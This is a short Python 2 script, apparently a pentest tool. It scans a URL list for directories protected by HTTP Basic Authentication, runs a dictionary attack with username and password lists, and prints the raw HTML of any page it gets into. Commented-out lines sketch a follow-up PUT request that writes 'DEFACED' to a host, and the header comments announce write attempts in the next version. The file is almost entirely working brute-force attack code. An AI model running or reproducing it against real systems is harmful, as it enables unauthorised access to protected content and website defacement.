#!/usr/bin/python
#This tool takes an URLs list (from previous web directory search) and search for web directories
#requiring Basic Authentication, then, proceeds to do a dictionary attack.  If there is a 
#successful authentication, it shows the page (raw html) on stdout.
#Next version will test for PUT method enabled and try to write something
#Author : Walter Cuestas @wcu35745
#urls2test.lst must contain full urls such as http://www.example.com/news and just one per line
#usuarios.lst must contain the user names to test and just one per line
#passwords.lst must contain the passwords to test and just one per line
import urllib2
import sys
import base64
import httplib

headers = { 'User-Agent' : 'Mozilla/5.0' }

urls2test = open("./urls2test.lst","r+")
todos_los_urls2test = urls2test.readlines()
urls2test.close()

for url in todos_los_urls2test:
        #solicitud = urllib2.Request(todos_los_urls2test[0],None, headers)
        solicitud = urllib2.Request(url,None, headers)

        try:
           urllib2.urlopen(solicitud)
        except urllib2.HTTPError, err:
           if err.code == 401:
               print ('Requiere Autenticacion')
               usuarios = open("./usuarios.lst","r+")
               todos_los_usuarios = usuarios.readlines()
               usuarios.close()

               passwords = open("./passwords.lst","r+")
               todos_los_passwords = passwords.readlines()
               passwords.close()

               for usuario,password in zip(todos_los_usuarios,todos_los_passwords):
                       base64string = base64.b64encode('%s:%s' % (usuario.replace("\n",""),password.replace("\n","")))
                       solicitud.add_header("Authorization", "Basic %s" % base64string)
                       try:
                               rpta = urllib2.urlopen(solicitud)
                               #connection =  httplib.HTTPConnection('192.168.1.106:80')
                               #body_content = 'DEFACED'
                               #connection.request('PUT', '/topsecret/', body_content)
                               payload = rpta.read()
                               print(payload)
                               break
                       except urllib2.HTTPError, err:
                               if err.code != 401:
                                       exit
           else:
               raise
